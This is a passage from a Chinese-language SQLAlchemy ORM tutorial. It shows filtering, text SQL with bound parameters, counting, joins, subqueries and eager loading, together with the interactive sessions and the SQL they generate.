like（在有的后端不区分大小写，有的区分大小写，如果要不区分大小写，最好用ilike）</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name.like(<span class="string">'%wu%'</span>)).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name.like(<span class="string">'%wu%'</span>))))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name LIKE %s</span><br></pre></td></tr></table></figure><ol><li>in/not in</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># in</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name.in_([<span class="string">'wu wu'</span>,<span class="string">'hu'</span>])).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name.in_([<span class="string">'wu wu'</span>,<span class="string">'hu'</span>]))))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name IN (%s, %s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># not in</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(~User.name.in_([<span class="string">'wu wu'</span>,<span class="string">'hu'</span>])).all()</span><br><span class="line">[&lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(~User.name.in_([<span class="string">'wu wu'</span>,<span class="string">'hu'</span>]))))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name NOT IN (%s, %s)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ol><li>is null/is not null</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># is null</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name == <span class="keyword">None</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'None'</span>, fullname=<span class="string">'None'</span>, password=<span class="string">'None'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name == <span class="keyword">None</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name IS NULL</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name.is_(<span class="keyword">None</span>)).all()</span><br><span class="line">[&lt;User(name=<span class="string">'None'</span>, fullname=<span class="string">'None'</span>, password=<span class="string">'None'</span>)&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># is not null</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name != <span class="keyword">None</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name.isnot(<span class="keyword">None</span>)).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name.isnot(<span class="keyword">None</span>))))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name IS NOT NULL</span><br></pre></td></tr></table></figure><ol><li>and/or</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># and</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> and_</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name == <span class="string">'wu wu'</span>,User.fullname == <span class="string">'wu xxx xxxx'</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(and_(User.name == <span class="string">'wu wu'</span>,User.fullname == <span class="string">'wu xxx xxxx'</span>)).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name == <span class="string">'wu wu'</span>).filter(User.fullname == <span class="string">'wu xxx xxxx'</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(or_(User.name == <span class="string">'wu wu'</span>, User.name == <span class="string">'hu'</span>)).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br></pre></td></tr></table></figure><ol><li>match/contains</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 有的后端数据库可能不支持</span><br><span class="line">&gt;&gt;&gt; session.query(User).filter(User.name.contains(&apos;u w&apos;)).all()</span><br><span class="line">[&lt;User(name=&apos;wu wu&apos;, fullname=&apos;wu xxx xxxx&apos;, password=&apos;abcdef&apos;)&gt;]</span><br><span class="line">&gt;&gt;&gt; print(str(session.query(User).filter(User.name.contains(&apos;u w&apos;))))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE (users.name LIKE concat(concat(&apos;%%&apos;, %s), &apos;%%&apos;))</span><br></pre></td></tr></table></figure><h2 id="使用文本SQL"><a href="#使用文本SQL" class="headerlink" title="使用文本SQL"></a>使用文本SQL</h2><p><code>Query</code>通过指定它们与<code>text()</code>结合，可以灵活地使用文字字符串 ，这可以被大多数适用的方法所接受。例如， <code>filter()</code>和 <code>order_by()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> user <span class="keyword">in</span> session.query(User).filter(text(<span class="string">"id&lt;5"</span>)).order_by(text(<span class="string">"id"</span>)).all():</span><br><span class="line">print(user.name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wu wu</span><br><span class="line">hu</span><br><span class="line">qi</span><br><span class="line">hg</span><br></pre></td></tr></table></figure><p>绑定参数可以使用冒号在基于字符串的SQL中指定。要指定值，可以使用<code>params()</code>方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(text(<span class="string">"id&lt;:value and name=:name"</span>)). \</span><br><span class="line">    params(value=<span class="number">2</span>, name=<span class="string">'wu wu'</span>).order_by(User.id).first()</span><br><span class="line">&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(text(<span class="string">"id&lt;:value and name=:name"</span>)). \</span><br><span class="line">    params(value=<span class="number">2</span>, name=<span class="string">'wu wu'</span>).order_by(User.id)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE id&lt;%s <span class="keyword">and</span> name=%s ORDER BY users.id</span><br></pre></td></tr></table></figure></p><p>名称上的列匹配适用于简单情况，但在处理包含重复列名称的复杂语句时或在使用不易与特定名称匹配的匿名化ORM结构时会变得很难处理。另外，在处理结果行时，我们可能会发现映射列中存在打字行为。对于这些情况，该<code>text()</code>构造允许我们将其文本SQL位置链接到Core或ORM映射列表达式; 可以通过将列表达式作为位置参数传递给<code>TextClause.columns()</code>方法来实现此目的:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stmt = text(<span class="string">"SELECT name, id, fullname, password FROM users where name=:name"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stmt = stmt.columns(User.name, User.id, User.fullname, User.password)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).from_statement(stmt).params(name=<span class="string">'wu wu'</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).from_statement(stmt).params(name=<span class="string">'wu wu'</span>)))</span><br><span class="line">SELECT name, id, fullname, password FROM users where name=%s</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p><h2 id="计数"><a href="#计数" class="headerlink" title="计数"></a>计数</h2><p><code>Query</code>有一个便利的计数方法<code>count()</code>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name.like(<span class="string">'%wu'</span>)).count()</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>对于需要特别指出“要计数的东西”的情况，我们可以直接使用表达式指定“计数”函数<code>func.count()</code>，可从<code>func</code>构造中获得:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> func</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(func.count(User.name), User.name).group_by(User.name).all()</span><br><span class="line">[(<span class="number">0</span>, <span class="keyword">None</span>), (<span class="number">1</span>, <span class="string">'hg'</span>), (<span class="number">1</span>, <span class="string">'hu'</span>), (<span class="number">1</span>, <span class="string">'qi'</span>), (<span class="number">1</span>, <span class="string">'wu wu'</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(func.count(User.name), User.name).group_by(User.name)))</span><br><span class="line">SELECT count(users.name) AS count_1, users.name AS users_name </span><br><span class="line">FROM users GROUP BY users.name</span><br></pre></td></tr></table></figure></p><p><code>SELECT  count(*)  FROM  table</code>写法:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(func.count(<span class="string">'*'</span>)).select_from(User).scalar()</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(func.count(<span class="string">'*'</span>)).select_from(User)))</span><br><span class="line">SELECT count(%s) AS count_1 </span><br><span class="line">FROM users</span><br></pre></td></tr></table></figure></p><h2 id="相关对象"><a href="#相关对象" class="headerlink" title="相关对象"></a>相关对象</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>user</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>address1 = Address(email_address=<span class="string">'1111111111@xx.com'</span>,user=user)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>address2 = Address(email_address=<span class="string">'2222222222@xx.com'</span>,user=user)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.add_all([address1,address2])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.commit()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user.addresses</span><br><span class="line">[&lt;Address(email_address=<span class="string">'1111111111@xx.com'</span>)&gt;, &lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>address1.user</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>address2.user</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>在User上执行查询时并不会将addresses也查询出来<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'None'</span>, fullname=<span class="string">'None'</span>, password=<span class="string">'None'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(session.query(User))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p><p>只有当查询user.addresses集合时才会加载，因为使用的是惰性加载</p><h2 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h2><p><code>User</code>和之间的简单隐式连接<code>Address</code>，我们可以使用<code>Query.filter()</code>它们将相关的列等同起来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> u, a <span class="keyword">in</span> session.query(User, Address).\</span><br><span class="line">                        filter(User.id==Address.user_id).\</span><br><span class="line">                        all():</span><br><span class="line">print(u,a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; &lt;Address(email_address=<span class="string">'1111111111@xx.com'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; &lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>使用<code>Query.join()</code>也可以实现上面的查询：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> u, a <span class="keyword">in</span> session.query(User,Address).join(Address).all():</span><br><span class="line">print(u,a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; &lt;Address(email_address=<span class="string">'1111111111@xx.com'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; &lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p><p><code>Query.join()</code>知道如何连接<code>User</code> ，<code>Address</code>因为它们之间只有一个外键。如果没有外键或多个外键，<code>Query.join()</code>则在使用下列其中一种形式时效果更好：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query.join(Address, User.id==Address.user_id)    <span class="comment"># explicit condition</span></span><br><span class="line">query.join(User.addresses)                       <span class="comment"># specify relationship from left to right</span></span><br><span class="line">query.join(Address, User.addresses)              <span class="comment"># same, with explicit target</span></span><br><span class="line">query.join(<span class="string">'addresses'</span>)                          <span class="comment"># same, using a string</span></span><br></pre></td></tr></table></figure></p><p><code>Query</code>如果有多个实体，选择什么？<br><code>Query.join()</code>方法<strong>通常会从</strong>实体列表中<strong>最左边的项加入，</strong>省略ON子句或ON子句是普通SQL表达式时。要控制JOIN列表中的第一个实体，使用<code>Query.select_from()</code>方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query = session.query(User, Address).select_from(Address).join(User)</span><br></pre></td></tr></table></figure></p><h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy.sql <span class="keyword">import</span> func</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stmt = session.query(Address.user_id, func.count(<span class="string">'*'</span>).\</span><br><span class="line">            label(<span class="string">'address_count'</span>)).\</span><br><span class="line">            group_by(Address.user_id).subquery()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> u, count <span class="keyword">in</span> session.query(User, stmt.c.address_count).\</span><br><span class="line">        outerjoin(stmt, User.id==stmt.c.user_id).order_by(User.id):</span><br><span class="line">        print(u, count)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; <span class="keyword">None</span></span><br><span class="line">&lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; <span class="keyword">None</span></span><br><span class="line">&lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; <span class="keyword">None</span></span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; <span class="number">2</span></span><br><span class="line">&lt;User(name=<span class="string">'None'</span>, fullname=<span class="string">'None'</span>, password=<span class="string">'None'</span>)&gt; <span class="keyword">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User, stmt.c.address_count).\</span><br><span class="line">        outerjoin(stmt, User.id==stmt.c.user_id).order_by(User.id)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password, anon_1.address_count AS anon_1_address_count </span><br><span class="line">FROM users LEFT OUTER JOIN (SELECT addresses.user_id AS user_id, count(%s) AS address_count </span><br><span class="line">FROM addresses GROUP BY addresses.user_id) AS anon_1 ON users.id = anon_1.user_id ORDER BY users.id</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>如果希望子查询映射到实体？可以使用<code>aliased()</code> 将映射类的“别名”关联到子查询：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stmt = session.query(Address).\</span><br><span class="line">                    filter(Address.email_address != <span class="string">'j25@yahoo.com'</span>).\</span><br><span class="line">                    subquery()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>adalias = aliased(Address, stmt)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> user, address <span class="keyword">in</span> session.query(User, adalias).\</span><br><span class="line">            join(adalias, User.addresses):</span><br><span class="line">        print(user)</span><br><span class="line">        print(address)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&lt;Address(email_address=<span class="string">'1111111111@xx.com'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;</span><br></pre></td></tr></table></figure></p><h2 id="常见关系运算符"><a href="#常见关系运算符" class="headerlink" title="常见关系运算符"></a>常见关系运算符</h2><ul><li><p><code>__eq__()</code>（多对一“等于”比较）：</p><p>  <code>query.filter(Address.user == someuser)</code></p></li><li><p><code>__ne__()</code>（多对一“不等于”比较）：</p><p><code>query.filter(Address.user != someuser)</code></p></li><li><p>IS NULL（多对一比较，也可使用<code>__eq__()</code>)    </p></li><li><p> <code>query.filter(Address.user == None</code>)</p></li><li><p><code>contains()</code>（用于一对多集合）：</p><p><code>query.filter(User.addresses.contains(someaddress))</code></p></li><li><p><code>any()</code>（用于集合）：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query.filter(User.addresses.any(Address.email_address == &apos;bar&apos;))</span><br><span class="line"></span><br><span class="line"># also takes keyword arguments:</span><br><span class="line">query.filter(User.addresses.any(email_address=&apos;bar&apos;))</span><br></pre></td></tr></table></figure></li><li><p><code>has()</code>（用于标量参考）：</p><p><code>query.filter(Address.user.has(name=&#39;ed&#39;))</code></p></li><li><p><code>Query.with_parent()</code>（用于任何关系）：</p><p><code>session.query(Address).with_parent(someuser, &#39;addresses&#39;)</code></p></li></ul><h2 id="急切加载"><a href="#急切加载" class="headerlink" title="急切加载"></a>急切加载</h2><p>如果没有指定关系加载的方式，默认是延迟加载，例如上面的User.addresses,如果要在查询时加载关系，需要使用<code>Query.options()</code>指定加载的方式</p><h3 id="子查询加载"><a href="#子查询加载" class="headerlink" title="子查询加载"></a>子查询加载</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> subqueryload</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg = session.query(User).\</span><br><span class="line">                    options(subqueryload(User.addresses)).\</span><br><span class="line">                    filter_by(name=<span class="string">'hg'</span>).one()</span><br><span class="line"></span><br><span class="line">SELECT users.id AS users_id,</span><br><span class="line">        users.name AS users_name,</span><br><span class="line">        users.fullname AS users_fullname,</span><br><span class="line">        users.password AS users_password</span><br><span class="line">FROM users</span><br><span class="line">WHERE users.name = ?</span><br><span class="line">SELECT addresses.id AS addresses_id,</span><br><span class="line">        addresses.email_address AS addresses_email_address,</span><br><span class="line">        addresses.user_id AS addresses_user_id,</span><br><span class="line">        anon_1.users_id AS anon_1_users_id</span><br><span class="line">FROM (SELECT users.id AS users_id</span><br><span class="line">    FROM users WHERE users.name = ?) AS anon_1</span><br><span class="line">JOIN addresses ON anon_1.users_id = addresses.user_id</span><br><span class="line">ORDER BY anon_1.users_id, 